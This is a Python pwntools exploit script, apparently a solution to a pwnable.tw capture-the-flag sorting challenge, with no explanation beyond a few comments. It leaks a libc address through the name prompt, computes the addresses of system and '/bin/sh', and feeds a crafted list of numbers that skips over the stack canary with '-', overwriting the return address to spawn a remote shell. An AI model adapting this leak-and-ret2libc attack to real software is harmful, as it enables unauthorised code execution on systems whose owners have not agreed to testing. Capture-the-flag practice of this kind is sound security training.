from pwn import *

PROG = './chal'
db = """b *main+240
b *main+340
c
"""

r = remote('chall.pwnable.tw', 10101)
#r = process(PROG)
#r = gdb.debug(PROG, db)

r.sendafter(b'What your name :', b'A' * (4*4))
r.recvuntil(b'Hello AAAAAAAAAAAAAAAA')

leak_addr = unpack(r.recv(4), 32, endian='little')
offset = 0x8f82f #obtained by subtracting from vmmap libc base
log.info('Leaked addr: ' + hex(leak_addr))

libc_base = leak_addr - offset
log.info('Libc base addr: ' + hex(libc_base))

system = libc_base + 0x3a940
binsh = libc_base + 0x158e8b

r.recvuntil(b'sort :')
r.sendline(b'35')

for i in range(35):
    r.recvuntil(b'number : ')
    msg = b'0'
    if i == 24:
        msg = b'-'
    elif i == 32:
        msg = str(system)
    elif i == 33 or i == 34:
        msg = str(binsh)
    elif i > 24:
        msg = str(system - 1)
    r.sendline(msg)

r.interactive()
